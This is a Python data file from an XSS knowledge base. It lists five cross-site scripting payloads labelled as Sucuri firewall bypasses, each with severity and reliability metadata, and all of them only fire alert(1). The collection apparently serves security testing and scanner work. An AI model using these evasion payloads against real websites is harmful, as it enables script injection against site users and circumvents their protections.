#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Sucuri WAF Bypass Payloads
"""

from ..models import PayloadEntry


SUCURI_BYPASS_PAYLOADS = {
    "sucuri_1": PayloadEntry(
        payload="<svg/onload=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="SVG onload no space",
        tags=["sucuri", "waf-bypass", "svg"],
        waf_evasion=True,
        bypasses=["sucuri"],
        reliability="medium",
    ),
    "sucuri_2": PayloadEntry(
        payload="<img src=x onerror=alert`1`>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Template literal alert",
        tags=["sucuri", "waf-bypass", "template-literal"],
        waf_evasion=True,
        bypasses=["sucuri"],
        reliability="high",
    ),
    "sucuri_3": PayloadEntry(
        payload="<body/onload=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Body onload slash separator",
        tags=["sucuri", "waf-bypass", "body"],
        waf_evasion=True,
        bypasses=["sucuri"],
        reliability="medium",
    ),
    "sucuri_4": PayloadEntry(
        payload="<svg><animate onbegin=alert(1) attributeName=x>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="SVG animate onbegin",
        tags=["sucuri", "waf-bypass", "svg", "animate"],
        waf_evasion=True,
        bypasses=["sucuri"],
        reliability="high",
    ),
    "sucuri_5": PayloadEntry(
        payload="<details open ontoggle=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Details ontoggle",
        tags=["sucuri", "waf-bypass", "details"],
        waf_evasion=True,
        bypasses=["sucuri"],
        reliability="high",
    ),
}

SUCURI_BYPASS_PAYLOADS_TOTAL = len(SUCURI_BYPASS_PAYLOADS)
